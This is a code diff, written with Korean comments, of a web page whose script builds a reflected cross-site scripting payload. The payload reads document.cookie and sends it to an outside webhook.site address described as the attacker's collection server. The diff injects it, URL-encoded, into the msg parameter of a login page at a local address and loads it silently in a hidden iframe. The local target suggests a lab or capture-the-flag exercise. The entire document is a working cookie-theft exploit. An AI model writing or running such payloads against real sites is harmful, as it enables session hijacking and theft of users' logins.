@@ -9,19 +9,25 @@
         // 당신의 데이터 수집 서버 주소
         const attackerServer = 'https://webhook.site/262a214f-0239-40b5-a00e-1738028f5389';
 
-        // 1. document.cookie를 읽어 외부 서버로 전송하는 스크립트 페이로드
-        const scriptPayload = `
-            fetch('${attackerServer}/?cookie=' + encodeURIComponent(document.cookie));
-        `;
+        // 1. 실행할 스크립트 내용을 한 줄로 정의합니다. (줄바꿈 제거)
+        const scriptPayload = "fetch('" + attackerServer + "/?cookie=' + encodeURIComponent(document.cookie));";
 
-        // 2. XSS 페이로드를 login 페이지의 msg 파라미터에 삽입
-        const vulnerableUrl = `http://127.0.0.1:58039/login?msg=<script>${scriptPayload}<\/script>`;
+        // 2. 전체 <script> 태그를 문자열로 만듭니다.
+        const fullInjectableString = `<script>${scriptPayload}<\/script>`;
 
-        // 3. 보이지 않는 iframe을 생성하여 취약한 URL 로드
+        // 3. (핵심 수정사항) <script> 태그 전체를 URL 인코딩합니다.
+        const encodedPayload = encodeURIComponent(fullInjectableString);
+
+        // 4. 인코딩된 페이로드를 사용하여 최종 URL을 생성합니다.
+        const vulnerableUrl = `http://127.0.0.1:58039/login?msg=${encodedPayload}`;
+
+        // 5. 보이지 않는 iframe을 생성하여 취약한 URL 로드
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = vulnerableUrl;
         document.body.appendChild(iframe);
+
+        console.log("Iframe source URL:", vulnerableUrl);
     </script>
 </body>
 </html>
